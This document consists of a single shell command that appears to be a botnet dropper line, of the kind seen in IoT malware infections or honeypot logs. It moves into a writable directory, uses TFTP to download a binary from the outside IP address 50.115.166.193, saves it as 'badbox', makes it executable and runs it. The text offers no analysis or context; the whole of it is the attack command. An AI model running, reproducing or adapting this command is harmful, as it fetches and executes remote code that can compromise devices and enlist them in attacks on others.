cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r tftp -g 50.115.166.193;cat tftp >badbox;chmod +x *;./badbox
